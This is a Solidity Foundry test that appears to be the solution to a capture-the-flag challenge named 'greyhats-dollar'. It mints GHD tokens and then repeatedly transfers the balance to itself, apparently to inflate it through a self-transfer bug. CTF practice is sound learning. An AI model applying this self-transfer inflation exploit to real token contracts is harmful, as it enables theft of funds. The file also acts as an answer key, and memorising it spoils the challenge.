// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Setup as Challenge} from "../../src/greyhats-dollar/Setup.sol";
import {GREY} from "../../src/greyhats-dollar/lib/GREY.sol";
import {GHD} from "../../src/greyhats-dollar/GHD.sol";

contract SolutionTest is Test {
    Challenge internal challenge;
    GREY internal grey;
    GHD internal ghd;

    function setUp() public {
        challenge = new Challenge();
        grey = challenge.grey();
        ghd = challenge.ghd();
    }

    function testExploit() public {
        challenge.claim();
        uint256 amount = grey.balanceOf(address(this));
        grey.approve(address(ghd), type(uint256).max);
        ghd.mint(amount);

        for (uint256 i = 0; i < 100; i++) {
            ghd.transferFrom(address(this), address(this), ghd.balanceOf(address(this)));
        }

        assertTrue(challenge.isSolved());
    }
}
